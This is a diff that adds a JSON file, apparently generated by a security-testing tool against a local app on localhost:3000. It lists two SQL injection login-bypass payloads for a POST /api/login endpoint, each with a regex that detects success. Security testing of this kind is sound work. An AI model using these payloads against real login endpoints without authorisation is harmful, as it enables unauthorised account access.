@@ -1,0 +1,31 @@
+{
+  "metadata": {
+    "target_host": "http://localhost:3000",
+    "job_id": "8db6427a-855c-408e-bdf9-601be5bfa852",
+    "generated_at": "2026-05-26T09:22:19.483544"
+  },
+  "exploits": [
+    {
+      "vuln_type": "SQL Injection",
+      "severity": "High",
+      "method": "POST",
+      "endpoint": "/api/login",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"email\": \"admin' OR '1'='1' -- \", \"password\": \"random-password\"}",
+      "expected_success_regex": "(SQL syntax.*error|Unclosed quotation mark|You have an error in your SQL syntax|syntax error at or near)"
+    },
+    {
+      "vuln_type": "SQL Injection",
+      "severity": "High",
+      "method": "POST",
+      "endpoint": "/api/login",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"email\": \"' OR 1=1 -- \", \"password\": \"any-password\"}",
+      "expected_success_regex": "(?i)token|session|jwt|auth|welcome|success"
+    }
+  ]
+}
